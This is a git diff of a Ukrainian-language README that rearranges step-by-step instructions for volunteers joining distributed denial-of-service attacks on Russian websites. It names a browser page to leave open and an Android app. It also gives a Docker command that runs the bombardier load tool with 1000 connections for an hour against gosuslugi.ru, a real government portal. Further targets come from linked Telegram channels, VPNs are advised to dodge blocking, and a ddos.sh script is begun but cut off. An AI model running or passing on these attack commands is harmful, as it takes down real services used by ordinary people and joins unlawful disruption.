@@ -1,14 +1,15 @@
-# Варіант 1 (для власників мобільних телефонів також)
-Просто відкрийте і залиште сайт відкритим - [https://stop-russian-desinformation.near.page/](https://stop-russian-desinformation.near.page/)  
+# Android/iOS
 **Впевніться, що у вас достатньо заряду акумулятора та є доступ до зарядки**  
-За можливості увімкніть VPN  
+1. За можилвості встановіть VPN (сервіси дуже швидко блокують ip адреси з України)  
+- [F-Secure](https://www.f-secure.com/en/home/login)  
+- [список альтернативних сервісів](https://t.me/c/1627443142/3)  
+2. [Android/iOS]  
+Просто відкрийте і залиште сайт відкритим - [https://stop-russian-desinformation.near.page/](https://stop-russian-desinformation.near.page/) 
+3. [Android]  
+[Встановіть додаток та слідуйте туторіалу за посиланням](https://telegra.ph/YAk-ddositi-na-telefon%D1%96-02-24)  
+Нові адреси для ddos атаки публікуються в [Telegram каналі](https://t.me/+97Y45he5lOI2ZTky)  
 
-# Канали для новин та координації
-- [https://t.me/+97Y45he5lOI2ZTky](https://t.me/+97Y45he5lOI2ZTky)
-- [https://t.me/ddosRussians](https://t.me/ddosRussians)
-- [https://t.me/itguildukraine](https://t.me/itguildukraine)
-
-# Варіант 2
+# Windows/Mac/Linux
 1. Встановіть [Docker](https://www.docker.com/products/docker-desktop)
 2. Встановіть VPN 
 - [F-Secure](https://www.f-secure.com/en/home/login) - РЕКОМЕНДОВАНО
@@ -20,10 +21,15 @@
 ```
 docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.gosuslugi.ru
 ```
-(замініть `https://www.gosuslugi.ru` на необхідний сайт - нові адреси для ddos атаки публікуються в [Telegram каналі](https://t.me/+97Y45he5lOI2ZTky) )  
+(замініть `https://www.gosuslugi.ru` на необхідний сайт - нові адреси для ddos атаки публікуються в [Telegram каналі](https://t.me/+97Y45he5lOI2ZTky))  
 **Ви можете відкрити декілька вікон терміналу**  
 
-## Доповнення  
+# Канали для новин та координації
+- [https://t.me/+97Y45he5lOI2ZTky](https://t.me/+97Y45he5lOI2ZTky)
+- [https://t.me/ddosRussians](https://t.me/ddosRussians)
+- [https://t.me/itguildukraine](https://t.me/itguildukraine)
+
+# Доповнення  
 Можете створити файл `ddos.sh` з контентом:
 ```
 #!/bin/bash -x
